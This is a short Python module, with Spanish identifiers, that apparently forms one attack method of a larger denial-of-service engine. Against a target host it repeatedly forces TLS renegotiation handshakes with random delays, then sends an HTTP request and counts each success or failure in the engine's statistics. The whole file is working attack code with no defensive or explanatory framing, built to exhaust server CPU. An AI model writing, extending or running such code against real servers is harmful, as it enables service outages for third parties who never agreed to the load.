import asyncio
import random
import ssl
import socket
from OpenSSL import SSL

class RenegociacionSSL:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        try:
            contexto = SSL.Context(SSL.TLSv1_2_METHOD)
            contexto.set_cipher_list('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384')
            
            conexion = SSL.Connection(contexto, socket.socket())
            conexion.connect((self.motor.host, self.motor.puerto))
            conexion.set_tlsext_host_name(self.motor.host.encode())
            conexion.set_connect_state()
            conexion.do_handshake()
            
            for _ in range(random.randint(5, 20)):
                conexion.renegotiate()
                conexion.do_handshake()
                await asyncio.sleep(random.uniform(0.01, 0.1))
                
            conexion.sendall(b"GET / HTTP/1.1\r\nHost: " + self.motor.host.encode() + b"\r\n\r\n")
            conexion.recv(1024)
            
            conexion.shutdown()
            conexion.close()
            
            self.motor.estadisticas.agregar_exito(1)
            
        except:
            self.motor.estadisticas.agregar_error()